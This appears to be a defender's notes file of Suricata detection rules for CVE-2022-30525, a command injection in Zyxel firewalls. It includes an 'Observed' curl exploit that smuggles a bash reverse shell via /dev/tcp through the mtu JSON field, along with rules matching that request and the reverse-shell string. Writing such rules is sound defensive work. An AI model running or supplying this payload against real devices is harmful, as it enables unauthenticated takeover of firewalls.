######################################################################################################################

https://attackerkb.com/topics/LbcysnvxO2/cve-2022-30525/rapid7-analysis?referrer=activityFeed
https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/
https://github.com/jbaines-r7/victorian_machinery
Observed -> "curl -v --insecure -X POST -H "Content-Type: application/json" -d '{"command":"setWanPortSt","proto":"dhcp","port":"1270","vlan_tagged":"1","vlanid":"5","mtu":"; bash -c \"exec bash -i &>/dev/tcp/10.0.0.2/1270 <&1;\";","data":"hi"}' https://10.0.0.14/ztp/cgi-bin/handler"

######################################################################################################################

# Rule written by Rapid7 / Attacerkb

      alert http any any -> any any ( \
      msg:"Possible Zyxel ZTP setWanPortSt mtu Exploit Attempt"; \
      flow:to_server; \
      http.method; content:"POST"; \
      http.uri; content:"/ztp/cgi-bin/handler"; \
      http.request_body; content:"setWanPortSt"; \
      http.request_body; content:"mtu"; \
      http.request_body; pcre:"/mtu["']\s*:\s*["']\s*[^0-9]+/i";
      classtype:misc-attack; \
      sid:221270;)
                
# Assigned some source/desintaion variables, and followed suricata source doc. Stripped pcre, can add it back if there are FP's

      alert tcp $EXTERNAL_NET any -> $HOME_NET any(msg:"CVE-2022-30525 Observed from External"; \
      flow:to_server, \
      content:"POST"; http_method; \
      content:"/ztp/cgi-bin/handler"; http.uri; \
      content:"setWanPortSt"; http_client_body; \
      content:"mtu"; http_client_body; \
      priority:2; \
      metadata: Not tested for FP rate or accuracy; \
      reference:url,https://attackerkb.com/topics/LbcysnvxO2/cve-2022-30525/rapid7-analysis?referrer=activityFeed, CVE-2022-30525; \
      sid:1000003; rev:1;) \

# Content matcher for the reverse bash shell, could be generalized for any other bash shells

      alert tcp $EXTERNAL_NET any -> $HOME_NET any(msg:"Potential Reverse Bash Shell Detected"; \
      flow:to_server, \
      content:"POST"; http_method; \
      content:"exec|20|bash|20 2d|i"; http_client_body; \
      priority:3; \
      metadata: Not tested for FP rate or accuracy; \
      reference:url,https://attackerkb.com/topics/LbcysnvxO2/cve-2022-30525/rapid7-analysis?referrer=activityFeed, CVE-2022-30525; \
      sid:1000004; rev:1;) \


Way Forward:

- Assign some content modifiers such as distance, offset, within for http_client_body
